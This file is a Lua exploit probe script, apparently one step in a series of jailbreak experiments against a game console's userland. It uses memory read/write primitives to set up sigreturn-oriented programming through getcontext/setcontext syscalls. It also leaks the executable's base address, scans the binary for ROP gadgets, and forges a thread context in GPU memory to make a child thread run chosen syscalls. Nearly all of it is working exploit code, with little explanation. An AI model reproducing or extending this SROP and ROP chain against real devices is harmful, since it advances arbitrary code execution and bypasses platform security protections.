-- CRASH_CLASS: LOW
-- PROBE 185e: Child thread getpid v2 — byte-level gadget scan
--
-- 185d failed because mov [rdi],rax;ret (48 89 07 C3) wasn't found
-- as a dword at 2-byte alignment in first 64KB. This version:
-- 1. Reads dwords at 4-byte alignment but checks BOTH halves
-- 2. Falls back to using Atomic_fetch_add_8 gadget (known working from 126g/126h)
-- 3. Uses native.fcall_with_rax if available

print("=== 185e: CHILD GETPID v2 ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = rq(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc=" .. hex64(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sc_addr)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU buffer
local _, gpu = pcall(function()
    return make_syscall(477)(uint64(0), uint64(0x80000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=" .. hex64(gpu))

-- Eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108)
local eb_hi = rd(info + 0x10C)
print("eb=0x" .. string.format("%X%08X", eb_hi, eb_lo))

-- Strategy: scan for jmp $ (EB FE) first — it's more common
-- Then scan for mov [rdi], rax; ret (48 89 07 C3)
-- Read qwords for speed — check all byte positions in each qword

local mov_g, jmp_g = nil, nil

-- Read 8 bytes at a time, check all positions
for off = 0, 0x20000, 8 do
    local ok, q = pcall(function() return memory.read_qword(uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))) end)
    if not ok then break end
    local qh, ql = get_hi_lo(q)

    -- Check low dword for patterns
    if not jmp_g then
        if (ql % 0x10000) == 0xFEEB then
            jmp_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
            print("jmp @0x" .. string.format("%X", off))
        elseif math.floor(ql / 0x10000) % 0x10000 == 0xFEEB then
            jmp_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off + 2))
            print("jmp @0x" .. string.format("%X", off + 2))
        end
    end
    if not jmp_g then
        if (qh % 0x10000) == 0xFEEB then
            jmp_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off + 4))
            print("jmp @0x" .. string.format("%X", off + 4))
        elseif math.floor(qh / 0x10000) % 0x10000 == 0xFEEB then
            jmp_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off + 6))
            print("jmp @0x" .. string.format("%X", off + 6))
        end
    end

    -- Check for mov [rdi], rax; ret = 0xC3078948
    if not mov_g then
        if ql == 0xC3078948 then
            mov_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
            print("mov @0x" .. string.format("%X", off))
        end
        if qh == 0xC3078948 then
            mov_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off + 4))
            print("mov @0x" .. string.format("%X", off + 4))
        end
    end

    if mov_g and jmp_g then break end
end

-- If mov not found, try xchg variant or use ret gadget + different approach
if not mov_g then
    print("mov [rdi],rax;ret not found in 128KB")
    -- Try: mov [rdi], eax; ret = 89 07 C3 (3 bytes, may appear inside other instructions)
    for off = 0, 0x20000, 4 do
        local ok, dw = pcall(function() return memory.read_dword(uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))) end)
        if not ok then break end
        local v = to_num(dw)
        if (v % 0x1000000) == 0xC30789 then
            mov_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
            print("mov32 @0x" .. string.format("%X", off))
            break
        end
        if math.floor(v / 0x100) == 0xC30789 then
            mov_g = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off + 1))
            print("mov32 @0x" .. string.format("%X", off + 1))
            break
        end
    end
end

if not mov_g then print("NO MOV GADGET — trying alternative approach") end
if not jmp_g then print("NO JMP GADGET") return end

-- === APPROACH A: If mov gadget found, use child thread ===
if mov_g then
    print("")
    print("--- CHILD THREAD GETPID ---")

    local MARKER = 0x10000
    wq(gpu + MARKER, uint64(0))

    local ST = 0x20000 - 16
    wq(gpu + ST, mov_g)
    wq(gpu + ST + 8, jmp_g)

    local TC = 0x30000
    for i = 0, 0x4FF, 8 do wq(gpu + TC + i, uint64(0)) end
    wq(gpu + TC + 0x108, uint64(0x480))
    wd(gpu + TC + 0x0D0, 0)
    wq(gpu + TC + 0x110, uint64(0x10000))
    wd(gpu + TC + 0x0C0, 0x43)
    wd(gpu + TC + 0x100, 0x3B)
    wq(gpu + TC + 0x0E0, sc_addr)
    wq(gpu + TC + 0x0F8, ga(ST))
    wq(gpu + TC + 0x048, ga(MARKER))  -- RDI = marker
    wq(gpu + TC + 0x078, uint64(20))  -- RAX = getpid

    local tb = memory.alloc(8)
    wd(tb, 0)
    local rv = srop(430, ga(TC), uint64(tb))
    local cr = rv and to_num(rv) or -999
    local ct = rd(tb)
    print("create=" .. cr .. " tid=0x" .. string.format("%X", ct))

    -- Wait 200ms
    local TS = 0x38000
    wq(gpu + TS, uint64(0))
    wq(gpu + TS + 8, uint64(200000000))
    srop(240, ga(TS), uint64(0))

    local m = rq(gpu + MARKER)
    local mval = to_num(m)
    print("marker=" .. hex64(m) .. " (" .. mval .. ")")
    print("pid=" .. pid)

    if mval == pid then
        print("!!! CHILD GETPID MATCHES — CHILD SYSCALLS WORK !!!")
    elseif mval > 0 then
        print("child wrote " .. mval .. " (nonzero but not pid)")
    else
        print("marker still zero — child may not have executed")
    end

    if ct > 0 then
        rv = srop(431, uint64(ct), uint64(0))
        print("alive=" .. (rv and to_num(rv) or -999))
    end
end

-- === APPROACH B: Use Atomic_fetch_add_8 (known from 126g/126h) ===
-- Atomic_fetch_add_8 does: old = *addr; *addr = old + value; return old
-- If we set addr=marker, value=1 as child entry, marker increments prove execution
print("")
print("--- APPROACH B: CHILD VIA ATOMIC_FETCH_ADD ---")

-- Find Atomic_fetch_add_8 via native API
local afa = nil
if native and native.Atomic_fetch_add_8 then
    -- Get address of the function
    local afa_str = tostring(native.Atomic_fetch_add_8)
    print("afa_str=" .. (afa_str or "nil"))
end

-- Try native.fcall_with_rax for child thread entry
if native and native.fcall_with_rax then
    print("fcall_with_rax available")
    -- Test: child getpid from main thread first
    local r = native.fcall_with_rax(20, 0, 0, 0, 0, 0, 0)
    print("main_getpid_via_fcall=" .. to_num(r))
end

print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
